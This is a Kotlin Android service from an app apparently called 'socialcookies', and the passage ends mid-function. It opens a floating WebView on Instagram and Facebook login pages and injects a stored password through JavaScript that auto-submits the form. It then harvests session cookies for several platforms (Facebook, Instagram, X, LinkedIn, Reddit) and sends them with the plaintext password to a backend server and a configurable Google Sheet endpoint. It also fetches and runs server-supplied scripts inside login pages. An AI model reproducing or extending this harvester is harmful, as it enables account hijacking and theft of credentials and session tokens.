package dev.daymond.socialcookies

import android.animation.ValueAnimator
import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.ApplicationInfo
import android.graphics.PixelFormat
import android.net.Uri
import android.os.*
import android.view.*
import android.view.animation.DecelerateInterpolator
import android.webkit.*
import android.widget.*
import androidx.core.app.NotificationCompat
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.math.abs

open class FloatingService : Service() {

    protected lateinit var windowManager: WindowManager
    protected lateinit var floatingView: View
    protected lateinit var params: WindowManager.LayoutParams
    protected lateinit var webView: WebView
    protected lateinit var titleText: TextView
    protected lateinit var progressBar: ProgressBar

    private var isMinimized = false
    private var isDesktopMode = false
    private var isAutoWorkerEnabled = false

    private val expandedWidth by lazy { 320.toPx() }
    private val expandedHeight by lazy { 480.toPx() }
    private val minimizedSize by lazy { 50.toPx() }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.Main + serviceJob)

    protected var currentUrl = "https://www.instagram.com/accounts/login/"
    protected var currentPlatform: String = "instagram"
    private val mobileUA =
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
    private val desktopUA =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"

    private var cachedMasterPassword: String = ""
    private var cachedSheetUrl: String = ""
    private var cachedUserAgent: String = ""
    private var cachedUserUid: String = ""

    private val settingsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_UPDATE_SETTINGS) {
                intent.getStringExtra(EXTRA_MASTER_PASSWORD)?.let { if (it.isNotEmpty()) cachedMasterPassword = it }
                intent.getStringExtra(EXTRA_SHEET_URL)?.let { if (it.isNotEmpty()) cachedSheetUrl = it }
                intent.getStringExtra(EXTRA_USER_UID)?.let { if (it.isNotEmpty()) cachedUserUid = it }
                intent.getStringExtra(EXTRA_USER_AGENT)?.let {
                    if (it.isNotEmpty()) {
                        cachedUserAgent = it
                        if (::webView.isInitialized && !isDesktopMode) {
                            webView.settings.userAgentString = it
                        }
                    }
                }
                Toast.makeText(
                    this@FloatingService,
                    "Settings synced to window (${getDataDirectorySuffix()})",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    companion object {
        const val ACTION_UPDATE_SETTINGS = "dev.daymond.socialcookies.ACTION_UPDATE_SETTINGS"
        const val EXTRA_MASTER_PASSWORD = "EXTRA_MASTER_PASSWORD"
        const val EXTRA_SHEET_URL = "EXTRA_SHEET_URL"
        const val EXTRA_USER_AGENT = "EXTRA_USER_AGENT"
        const val EXTRA_USER_UID = "EXTRA_USER_UID"
        const val EXTRA_PLATFORM = "EXTRA_PLATFORM"
        private const val TAG = "FloatingService"
    }

    open fun getNotificationId(): Int = 1
    open fun getDataDirectorySuffix(): String = "win1"
    open fun getInitialX(): Int = 0
    open fun getInitialY(): Int = 200

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            WebView.setDataDirectorySuffix(getDataDirectorySuffix())
        } catch (e: Exception) {
        }
        val sharedPref = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        cachedMasterPassword = sharedPref.getString("MASTER_PASSWORD", "") ?: ""
        cachedSheetUrl = sharedPref.getString("SHEET_WEB_APP_URL", "") ?: ""
        cachedUserAgent = sharedPref.getString("USER_AGENT", "") ?: ""
        cachedUserUid = sharedPref.getString("ACTIVE_USER_UID", "") ?: (FirebaseAuth.getInstance().currentUser?.uid ?: "")
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val contextWrapper = ContextThemeWrapper(this, R.style.Theme_IGCookies)
        floatingView = LayoutInflater.from(contextWrapper).inflate(R.layout.floating_layout, null)
        titleText = floatingView.findViewById(R.id.title_text)
        progressBar = floatingView.findViewById(R.id.web_progress_bar)

        setupLayoutParams()
        setupWebView()
        setupButtons()
        setupDragging()
        windowManager.addView(floatingView, params)

        val filter = IntentFilter(ACTION_UPDATE_SETTINGS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(settingsReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(settingsReceiver, filter)
        }

        // Background prefetch remote script for current platform
        serviceScope.launch(Dispatchers.IO) {
            try {
                BackendApiManager.fetchRemoteScript(this@FloatingService, "autoworker_js", currentPlatform)
            } catch (e: Exception) {
                // Ignore network failure; offline fallback is active
            }
        }
    }

    private fun setupLayoutParams() {
        params = WindowManager.LayoutParams(
            expandedWidth, expandedHeight,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else @Suppress(
                "DEPRECATION"
            ) WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = getInitialX()
            y = getInitialY()
        }
    }

    @SuppressLint("SetJavaScriptEnabled", "ClickableViewAccessibility")
    private fun setupWebView() {
        webView = floatingView.findViewById(R.id.webview)
        val sharedPref = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)

        val isDebuggable = 0 != (applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            WebView.setWebContentsDebuggingEnabled(isDebuggable)
        }

        webView.addJavascriptInterface(WebAppInterface(), "AndroidDebug")

        val effectiveUA =
            if (cachedUserAgent.isNotEmpty()) cachedUserAgent else sharedPref.getString("USER_AGENT", mobileUA)
                ?: mobileUA
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            @Suppress("DEPRECATION")
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            textZoom = 80
            userAgentString = effectiveUA
            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }
        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(webView, true)
        }
        webView.setInitialScale(75)
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                progressBar.visibility = if (newProgress < 100) View.VISIBLE else View.GONE
                progressBar.progress = newProgress
            }

            override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                consoleMessage?.let {
                    android.util.Log.d("AutoWorkerJS", "${it.message()} [${it.sourceId()}:${it.lineNumber()}]")
                }
                return super.onConsoleMessage(consoleMessage)
            }
        }
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                injectPassword(manual = false, autoSubmit = isAutoWorkerEnabled)
                checkAndAutoSaveCookies(url)

                if (isAutoWorkerEnabled) {
                    serviceScope.launch {
                        delay(2500)
                        checkAndAutoSaveCookies(webView.url ?: url)
                    }
                }
            }
        }
        webView.setOnTouchListener { _, event ->
            if (event.action == MotionEvent.ACTION_DOWN) requestFocus()
            false
        }
        floatingView.setOnTouchListener { _, event ->
            if (event.action == MotionEvent.ACTION_OUTSIDE) releaseFocus()
            false
        }
    }

    inner class WebAppInterface {
        @JavascriptInterface
        fun log(msg: String) {
            android.util.Log.d("AutoWorkerDebug", msg)
        }

        @JavascriptInterface
        fun toast(msg: String) {
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this@FloatingService, "[AutoWorker] $msg", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun injectPassword(manual: Boolean, autoSubmit: Boolean = isAutoWorkerEnabled) {
        val pass = if (cachedMasterPassword.isNotEmpty()) {
            cachedMasterPassword
        } else {
            getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("MASTER_PASSWORD", null)
        }

        if (pass.isNullOrEmpty()) {
            if (manual) Toast.makeText(this, "Master Password not set", Toast.LENGTH_SHORT).show()
            return
        }

        // Escape backslashes and single quotes for safe JS injection
        val safePass = pass.replace("\\", "\\\\").replace("'", "\\'")

        // Retrieve server-provided dynamic script (with fallback to default built-in script)
        val cachedCustomScript = BackendApiManager.getCachedScript(this, "autoworker_js", currentPlatform)
        val js = if (!cachedCustomScript.isNullOrBlank()) {
            android.util.Log.d(TAG, "Using remote AutoWorker script for platform: $currentPlatform")
            cachedCustomScript
                .replace("{{SAFE_PASS}}", safePass)
                .replace("'\$safePass'", "'$safePass'")
                .replace("\$safePass", safePass)
                .replace("{{SHOULD_SUBMIT}}", autoSubmit.toString())
                .replace("\$autoSubmit", autoSubmit.toString())
        } else {
            getDefaultAutoWorkerScript(safePass, autoSubmit)
        }

        webView.evaluateJavascript(js) {
            if (manual) Toast.makeText(this, "Password Injected", Toast.LENGTH_SHORT).show()
        }
    }

    /**
     * Default factory AutoWorker JS script used if no server override is active.
     */
    private fun getDefaultAutoWorkerScript(safePass: String, autoSubmit: Boolean): String {
        return """
        (function() {
            if (window.__autoWorkerRunning) {
                console.log('[AutoWorker] Script already running in window');
                return;
            }
            window.__autoWorkerRunning = true;

            function dbgLog(msg) {
                console.log('[AutoWorker] ' + msg);
                if (window.AndroidDebug && window.AndroidDebug.log) {
                    window.AndroidDebug.log(msg);
                }
            }

            function dbgToast(msg) {
                dbgLog('TOAST: ' + msg);
                if (window.AndroidDebug && window.AndroidDebug.toast) {
                    window.AndroidDebug.toast(msg);
                }
            }

            const passVal = '$safePass';
            const shouldSubmit = $autoSubmit;
            let submitted = false;

            dbgLog('AutoWorker script running. passLen=' + passVal.length + ', shouldSubmit=' + shouldSubmit);

            function setNativeValue(element, value) {
                if (!element) return;
                try {
                    const valueSetter = Object.getOwnPropertyDescriptor(element, 'value') ?
                        Object.getOwnPropertyDescriptor(element, 'value').set : null;
                    const prototypeValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                    
                    if (prototypeValueSetter && valueSetter !== prototypeValueSetter) {
                        prototypeValueSetter.call(element, value);
                    } else if (valueSetter) {
                        valueSetter.call(element, value);
                    } else {
                        element.value = value;
                    }
                } catch(e) {
                    element.value = value;
                }
            }

            function fillField(input, value) {
                if (!input || !value) return false;
                if (input.value === value) return true;
                
                dbgLog('Filling field #' + (input.id || input.name || input.type) + ' with password');
                setNativeValue(input, value);

                const tracker = input._valueTracker;
                if (tracker) {
                    try { tracker.setValue(''); } catch(e) {}
                }
                
                const opts = { bubbles: true, cancelable: true };
                input.dispatchEvent(new Event('input', opts));
                input.dispatchEvent(new Event('change', opts));
                input.dispatchEvent(new Event('blur', opts));
                return true;
            }

            function isUserFilled() {
                const selectors = [
                    '#m_login_email',
                    'input[name="email"]',
                    'input[name="username"]',
                    'input[type="tel"]',
                    'input[autocomplete="username"]',
                    'input[aria-label*="Phone"]',
                    'input[aria-label*="username"]',
                    'input[aria-label*="email"]',
                    'input[type="text"]'
                ];
                for (let sel of selectors) {
                    const inputs = document.querySelectorAll(sel);
                    for (let input of inputs) {
                        if (input.type !== 'password' && input.type !== 'hidden') {
                            const val = (input.value || '').trim();
                            if (val.length > 0) {
                                dbgLog('User input filled found (' + sel + '): "' + val + '"');
                                return true;
                            }
                        }
                    }
                }
                dbgLog('User input empty');
                return false;
            }

            function clickElement(el) {
                if (!el) return false;
                dbgLog('Clicking element: ' + (el.id || el.className || el.tagName));
                try { el.click(); } catch(e){}
                try {
                    const opts = { bubbles: true, cancelable: true, view: window };
                    el.dispatchEvent(new MouseEvent('mousedown', opts));
                    el.dispatchEvent(new MouseEvent('mouseup', opts));
                    el.dispatchEvent(new MouseEvent('click', opts));
                    if (window.PointerEvent) {
                        el.dispatchEvent(new PointerEvent('pointerdown', opts));
                        el.dispatchEvent(new PointerEvent('pointerup', opts));
                    }
                } catch(e){}
                try {
                    const form = el.closest('form');
                    if (form) {
                        dbgLog('Submitting closest form');
                        if (form.requestSubmit) {
                            form.requestSubmit();
                        } else {
                            form.submit();
                        }
                    }
                } catch(e){}
                return true;
            }

            function tryClickNotNow() {
                const elements = Array.from(document.querySelectorAll('button, div[role="button"], a, input[type="button"], input[type="submit"]'));
                for (let el of elements) {
                    const txt = (el.innerText || el.textContent || el.value || '').trim();
                    if (/^not\s*now$/i.test(txt) || /not\s*now/i.test(txt) || /এখনই\s*নয়/i.test(txt) || /নট\s*নাও/i.test(txt)) {
                        dbgToast('Found & clicking Not Now button: ' + txt);
                        clickElement(el);
                        return true;
                    }
                }
                return false;
            }

            function triggerSubmit() {
                if (submitted) return;
                submitted = true;
                dbgToast('Submitting login form...');
                
                // Allow retry if page didn't navigate after 3.5s
                setTimeout(function() {
                    submitted = false;
                }, 3500);

                setTimeout(function() {
                    const btnSelectors = [
                        '#m_login_button',
                        'button[type="submit"]',
                        'form button[type="submit"]',
                        'form button',
                        'input[type="submit"]',
                        'div[role="button"][aria-label="Log in"]',
                        'div[role="button"][aria-label*="Log"]',
                        'div[role="button"][aria-label*="log"]',
                        'div[role="button"]'
                    ];
                    let btn = null;
                    for (let sel of btnSelectors) {
                        const candidates = document.querySelectorAll(sel);
                        for (let candidate of candidates) {
                            const txt = (candidate.innerText || candidate.textContent || candidate.value || '').trim();
                            if (sel.includes('aria-label') || /^log\s*in$/i.test(txt) || /login/i.test(txt) || /লগ\s*ইন/i.test(txt)) {
                                btn = candidate;
                                dbgLog('Found login button by selector: ' + sel + ' with text: "' + txt + '"');
                                break;
                            }
                        }
                        if (btn) break;
                    }
                    if (!btn) {
                        const allButtons = Array.from(document.querySelectorAll('button, div[role="button"], input[type="button"], input[type="submit"]'));
                        for (let el of allButtons) {
                            const txt = (el.innerText || el.textContent || el.value || '').trim();
                            if (/^log\s*in$/i.test(txt) || /^login$/i.test(txt) || /লগ\s*ইন/i.test(txt)) {
                                btn = el;
                                dbgLog('Found login button by text: "' + txt + '"');
                                break;
                            }
                        }
                    }
                    if (btn) {
                        clickElement(btn);
                    } else {
                        dbgToast('Login button NOT found!');
                    }
                }, 400);
            }

            function process() {
                let passFilled = false;
                const passInputs = document.querySelectorAll('#m_login_password, input[name="pass"], input[type="password"], input[name="password"]');
                for (let input of passInputs) {
                    if (fillField(input, passVal)) {
                        passFilled = true;
                    }
                }

                const userInputs = document.querySelectorAll('#m_login_email, input[name="email"], input[name="username"], input[type="tel"], input[type="text"]');
                userInputs.forEach(function(input) {
                    if (!input.dataset.autoListen) {
                        input.dataset.autoListen = 'true';
                        const events = ['input', 'paste', 'change', 'keyup', 'blur'];
                        events.forEach(function(evtName) {
                            input.addEventListener(evtName, function() {
                                dbgLog('User event ' + evtName + ' triggered');
                                setTimeout(function() {
                                    if (shouldSubmit && !submitted && isUserFilled()) {
                                        triggerSubmit();
                                    }
                                }, 100);
                            });
                        });
                    }
                });

                const userIsFilled = isUserFilled();
                dbgLog('Process check: passFilled=' + passFilled + ', userIsFilled=' + userIsFilled + ', shouldSubmit=' + shouldSubmit + ', submitted=' + submitted);

                if (shouldSubmit && !submitted && passFilled && userIsFilled) {
                    triggerSubmit();
                }

                return passFilled;
            }

            process();
            
            // Polling capped to 20 cycles (20 seconds) or until submitted to prevent battery/CPU drain
            var checkCycles = 0;
            const maxCycles = 20;
            const iv = setInterval(function() {
                checkCycles++;
                if (checkCycles >= maxCycles || submitted) {
                    clearInterval(iv);
                    dbgLog('AutoWorker stopped polling. checkCycles=' + checkCycles + ', submitted=' + submitted);
                    return;
                }
                process();
            }, 1000);
        })();
        """.trimIndent()
    }

    private fun checkAndAutoSaveCookies(rawUrl: String?) {
        if (!isAutoWorkerEnabled || rawUrl.isNullOrEmpty()) return

        val cm = CookieManager.getInstance().apply { flush() }
        val uri = Uri.parse(rawUrl)
        val target = if (uri.scheme != null && uri.host != null) "${uri.scheme}://${uri.host}/" else rawUrl
        var cookies = cm.getCookie(target)

        if (cookies.isNullOrEmpty() || extractUid(cookies) == "not_found") {
            if (rawUrl.contains("facebook.com") || currentUrl.contains("facebook.com")) {
                val fbCookies = cm.getCookie("https://facebook.com")
                    ?: cm.getCookie("https://m.facebook.com")
                    ?: cm.getCookie("https://www.facebook.com")
                if (!fbCookies.isNullOrEmpty() && extractUid(fbCookies) != "not_found") {
                    cookies = fbCookies
                }
            } else if (rawUrl.contains("instagram.com") || currentUrl.contains("instagram.com")) {
                val igCookies = cm.getCookie("https://instagram.com")
                    ?: cm.getCookie("https://www.instagram.com")
                if (!igCookies.isNullOrEmpty() && extractUid(igCookies) != "not_found") {
                    cookies = igCookies
                }
            }
        }

        if (cookies.isNullOrEmpty()) return

        val uid = extractUid(cookies)
        if (uid != "not_found" && uid.isNotBlank()) {
            saveCookiesAction(rawUrl)
        }
    }

    private fun requestFocus() {
        if ((params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE) != 0) {
            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
            windowManager.updateViewLayout(floatingView, params)
        }
    }

    private fun releaseFocus() {
        if ((params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE) == 0) {
            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            windowManager.updateViewLayout(floatingView, params)
        }
    }

    private fun setupButtons() {
        floatingView.findViewById<ImageButton>(R.id.btn_close).setOnClickListener { stopSelf() }
        floatingView.findViewById<ImageButton>(R.id.btn_minimize).setOnClickListener { toggleMinimize() }
        floatingView.findViewById<ImageButton>(R.id.btn_refresh).setOnClickListener { webView.reload() }
        floatingView.findViewById<ImageView>(R.id.minimized_icon).setOnClickListener { toggleMinimize() }

        // Navigation
        floatingView.findViewById<ImageButton>(R.id.btn_back)
            .setOnClickListener { if (webView.canGoBack()) webView.goBack() }
        floatingView.findViewById<ImageButton>(R.id.btn_home).setOnClickListener { webView.loadUrl(currentUrl) }

        val btnAutoWorker = floatingView.findViewById<ImageButton>(R.id.btn_auto_worker)
        btnAutoWorker?.setOnClickListener {
            isAutoWorkerEnabled = !isAutoWorkerEnabled
            btnAutoWorker.setColorFilter(if (isAutoWorkerEnabled) 0xFF4CAF50.toInt() else 0xCCFFFFFF.toInt())
            Toast.makeText(this, if (isAutoWorkerEnabled) "Auto Worker: ON" else "Auto Worker: OFF", Toast.LENGTH_SHORT)
                .show()
            if (isAutoWorkerEnabled) {
                injectPassword(manual = true, autoSubmit = true)
                checkAndAutoSaveCookies(webView.url ?: currentUrl)
            }
        }

        floatingView.findViewById<ImageButton>(R.id.btn_save_to_sheet)
            .setOnClickListener { saveCookiesAction(webView.url ?: currentUrl) }

        val btnDesktop = floatingView.findViewById<ImageButton>(R.id.btn_desktop)
        btnDesktop.setOnClickListener {
            isDesktopMode = !isDesktopMode
            val normalUA = if (cachedUserAgent.isNotEmpty()) cachedUserAgent else getSharedPreferences(
                "AppPrefs",
                Context.MODE_PRIVATE
            ).getString("USER_AGENT", mobileUA) ?: mobileUA
            webView.settings.userAgentString =
                if (isDesktopMode) desktopUA else normalUA
            btnDesktop.setColorFilter(if (isDesktopMode) 0xFF1877F2.toInt() else 0xCCFFFFFF.toInt())
            webView.reload()
        }

        floatingView.findViewById<ImageButton>(R.id.btn_copy_cookies)
            .setOnClickListener { copyCookies(webView.url ?: currentUrl) }
        floatingView.findViewById<ImageButton>(R.id.btn_clear_data).setOnClickListener { clearWebData() }
    }

    private fun toggleMinimize() {
        isMinimized = !isMinimized
        val content = floatingView.findViewById<View>(R.id.floating_window_content)
        val icon = floatingView.findViewById<View>(R.id.minimized_icon)
        val startW = params.width;
        val startH = params.height
        val targetW = if (isMinimized) minimizedSize else expandedWidth
        val targetH = if (isMinimized) minimizedSize else expandedHeight

        ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 250
            interpolator = DecelerateInterpolator()
            addUpdateListener {
                val f = it.animatedValue as Float
                params.width = (startW + (targetW - startW) * f).toInt()
                params.height = (startH + (targetH - startH) * f).toInt()
                if (f > 0.5f) {
                    content.visibility = if (isMinimized) View.GONE else View.VISIBLE
                    icon.visibility = if (isMinimized) View.VISIBLE else View.GONE
                }
                windowManager.updateViewLayout(floatingView, params)
                if (f == 1f && isMinimized) {
                    snapToEdge()
                }
            }
            start()
        }
    }

    @SuppressLint("ClickableViewAccessibility")
    private fun setupDragging() {
        val topBar = floatingView.findViewById<View>(R.id.top_bar)
        val minimizedIcon = floatingView.findViewById<View>(R.id.minimized_icon)
        val listener = object : View.OnTouchListener {
            private var initX = 0;
            private var initY = 0
            private var touchX = 0f;
            private var touchY = 0f
            private var isDrag = false
            override fun onTouch(v: View, e: MotionEvent): Boolean {
                when (e.action) {
                    MotionEvent.ACTION_DOWN -> {
                        initX = params.x; initY = params.y
                        touchX = e.rawX; touchY = e.rawY
                        isDrag = false
                        requestFocus()
                        return true
                    }

                    MotionEvent.ACTION_MOVE -> {
                        val dx = (e.rawX - touchX).toInt()
                        val dy = (e.rawY - touchY).toInt()
                        if (abs(dx) > 5 || abs(dy) > 5) {
                            isDrag = true
                            params.x = initX + dx
                            params.y = initY + dy
                            windowManager.updateViewLayout(floatingView, params)
                        }
                        return true
                    }

                    MotionEvent.ACTION_UP -> {
                        if (!isDrag) v.performClick() else snapToEdge()
                        return true
                    }
                }
                return false
            }
        }
        topBar.setOnTouchListener(listener)
        minimizedIcon.setOnTouchListener(listener)
    }

    private fun snapToEdge() {
        val screenWidth = resources.displayMetrics.widthPixels
        val targetX = if (params.x + params.width / 2 < screenWidth / 2) 0 else screenWidth - params.width
        ValueAnimator.ofInt(params.x, targetX).apply {
            duration = 350
            interpolator = DecelerateInterpolator()
            addUpdateListener {
                params.x = it.animatedValue as Int
                try {
                    windowManager.updateViewLayout(floatingView, params)
                } catch (e: Exception) {
                }
            }
            start()
        }
    }

    private fun saveCookiesAction(rawUrl: String) {
        val cm = CookieManager.getInstance().apply { flush() }
        val uri = Uri.parse(rawUrl)
        val target = if (uri.scheme != null && uri.host != null) "${uri.scheme}://${uri.host}/" else rawUrl
        var cookies = cm.getCookie(target)

        if (cookies.isNullOrEmpty() || extractUid(cookies) == "not_found") {
            if (rawUrl.contains("facebook.com") || currentUrl.contains("facebook.com")) {
                val fbCookies = cm.getCookie("https://facebook.com")
                    ?: cm.getCookie("https://m.facebook.com")
                    ?: cm.getCookie("https://www.facebook.com")
                if (!fbCookies.isNullOrEmpty() && extractUid(fbCookies) != "not_found") {
                    cookies = fbCookies
                }
            } else if (rawUrl.contains("instagram.com") || currentUrl.contains("instagram.com")) {
                val igCookies = cm.getCookie("https://instagram.com")
                    ?: cm.getCookie("https://www.instagram.com")
                if (!igCookies.isNullOrEmpty() && extractUid(igCookies) != "not_found") {
                    cookies = igCookies
                }
            }
        }

        if (cookies.isNullOrEmpty()) {
            Toast.makeText(this, "No cookies found", Toast.LENGTH_SHORT).show()
            return
        }

        val uid = extractUid(cookies)
        if (uid == "not_found" || uid.isBlank()) {
            Toast.makeText(this, "User ID not found in session cookies", Toast.LENGTH_SHORT).show()
            return
        }

        val host = Uri.parse(target).host ?: if (rawUrl.contains("facebook.com")) "facebook.com" else "instagram.com"

        val currentPassword = if (cachedMasterPassword.isNotEmpty()) {
            cachedMasterPassword
        } else {
            getSharedPreferences("AppPrefs", Context.MODE_PRIVATE).getString("MASTER_PASSWORD", "") ?: ""
        }

        val currentUid = if (cachedUserUid.isNotEmpty()) {
            cachedUserUid
        } else {
            FirebaseAuth.getInstance().currentUser?.uid
                ?: getSharedPreferences("AppPrefs", Context.MODE_PRIVATE).getString("ACTIVE_USER_UID", "") ?: ""
        }

        serviceScope.launch(Dispatchers.IO) {
            try {
                val dao = AppDatabase.getDatabase(this@FloatingService).cookieDao()

                // Check if UID already exists for this user
                val existing = if (currentUid.isNotEmpty()) {
                    dao.getByUserAndUid(currentUid, uid)
                } else {
                    dao.getByUid(uid)
                }

                val recordToSave: CookieRecord
                if (existing != null) {
                    recordToSave = existing.copy(
                        userUid = currentUid,
                        host = host,
                        cookies = cookies,
                        password = if (currentPassword.isNotEmpty()) currentPassword else existing.password,
                        timestamp = System.currentTimeMillis(),
                        isSynced = false
                    )
                    dao.update(recordToSave)
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@FloatingService, "Updated cookies for UID: $uid", Toast.LENGTH_SHORT).show()
                    }
                } else {
                    recordToSave = CookieRecord(
                        userUid = currentUid,
                        host = host,
                        uid = uid,
                        cookies = cookies,
                        password = currentPassword,
                        timestamp = System.currentTimeMillis(),
                        isSynced = false,
                        isLive = true
                    )
                    dao.insert(recordToSave)
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@FloatingService, "Saved to DB (UID: $uid)", Toast.LENGTH_SHORT).show()
                    }
                }

                // Automatically synchronize captured cookie with Backend API Server
                val syncResult = BackendApiManager.syncCookies(this@FloatingService, listOf(recordToSave))
                if (syncResult.isSuccess) {
                    dao.update(recordToSave.copy(isSynced = true))
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@FloatingService, "Synced to API Server", Toast.LENGTH_SHORT).show()
                    }
                } else {
                    android.util.Log.w(TAG, "Backend auto-sync pending: ${syncResult.exceptionOrNull()?.message}")
                }

                // Export to Google Sheet if configured
                exportRecordToSheet(recordToSave)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun extractUid(cookies: String): String {
        val parts = cookies.split(";")
        for (part in parts) {
            val cleanPart = part.trim()
            if (cleanPart.startsWith("c_user=")) {
                val value = cleanPart.substringAfter("c_user=").trim()
                if (value.isNotEmpty()) return value
            }
            if (cleanPart.startsWith("ds_user_id=")) {
                val value = cleanPart.substringAfter("ds_user_id=").trim()
                if (value.isNotEmpty()) return value
            }
            if (cleanPart.startsWith("twid=")) {
                val value = cleanPart.substringAfter("twid=").trim().removePrefix("u%3D").removePrefix("u=")
                if (value.isNotEmpty()) return value
            }
            if (cleanPart.startsWith("li_at=")) {
                val value = cleanPart.substringAfter("li_at=").trim()
                if (value.isNotEmpty()) return value.take(16)
            }
            if (cleanPart.startsWith("sessionid=")) {
                val value = cleanPart.substringAfter("sessionid=").trim()
                if (value.isNotEmpty()) return value.take(16)
            }
            if (cleanPart.startsWith("reddit_session=")) {
                val value = cleanPart.substringAfter("reddit_session=").trim()
                if (value.isNotEmpty()) return value.take(16)
            }
        }
        return "not_found"
    }

    private suspend fun exportRecordToSheet(record: CookieRecord) = withContext(Dispatchers.IO) {
        val sheetUrl = if (cachedSheetUrl.isNotEmpty()) {
            cachedSheetUrl
        } else {
            getSharedPreferences("AppPrefs", Context.MODE_PRIVATE).getString("SHEET_WEB_APP_URL", "") ?: ""
        }
        if (sheetUrl.isEmpty()) return@withContext

        try {
            val postData = "host=" + URLEncoder.encode(record.host, "UTF-8") +
                    "&uid=" + URLEncoder.encode(record.uid, "UTF-8") +
                    "&password=" + URLEncoder.encode(record.password, "UTF-8") +
                    "&cookies=" + URLEncoder.encode(record.cookies, "UTF-8")

            val url = URL(sheetUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.outputStream.use { it.write(postData.toByteArray()) }

            val responseCode = conn.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
                // Update synced status
                AppDatabase.getDatabase(this@FloatingService).cookieDao().update(record.copy(isSynced = true))
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@FloatingService, "Exported to Sheet", Toast.LENGTH_SHORT).show()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun copyCookies(rawUrl: String) {
        val cm = CookieManager.getInstance().apply { flush() }
        val uri = Uri.parse(rawUrl)
        val target = if (uri.scheme != null && uri.host != null) "${uri.scheme}://${uri.host}/" else rawUrl
        var cookies = cm.getCookie(target)

        if (cookies.isNullOrEmpty() || extractUid(cookies) == "not_found") {
            if (rawUrl.contains("facebook.com") || currentUrl.contains("facebook.com")) {
                val fbCookies = cm.getCookie("https://facebook.com")
                    ?: cm.getCookie("https://m.facebook.com")
                    ?: cm.getCookie("https://www.facebook.com")
                if (!fbCookies.isNullOrEmpty()) cookies = fbCookies
            } else if (rawUrl.contains("instagram.com") || currentUrl.contains("instagram.com")) {
                val igCookies = cm.getCookie("https://instagram.com")
                    ?: cm.getCookie("https://www.instagram.com")
                if (!igCookies.isNullOrEmpty()) cookies = igCookies
            }
        }

        if (!cookies.isNullOrEmpty()) {
            (getSystemService(CLIPBOARD_SERVICE) as ClipboardManager).setPrimaryClip(
                ClipData.newPlainText(
                    "Cookies",
                    cookies
                )
            )
            Toast.makeText(this, "Cookies copied for ${Uri.parse(target).host ?: target}", Toast.LENGTH_SHORT).show()
        } else Toast.makeText(this, "No cookies found", Toast.LENGTH_SHORT).show()
    }

    private fun clearWebData() {
        CookieManager.getInstance().removeAllCookies { CookieManager.getInstance().flush() }
        WebStorage.getInstance().deleteAllData()
        webView.apply { clearCache(true); clearHistory(); clearFormData(); loadUrl(currentUrl) }
        Toast.makeText(this, "All web data cleared", Toast.LENGTH_SHORT).show()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) {
            intent.getStringExtra(EXTRA_USER_UID)?.let {
                if (it.isNotEmpty()) {
                    cachedUserUid = it
                    getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
                        .edit()
                        .putString("ACTIVE_USER_UID", it)
                        .apply()
                }
            }
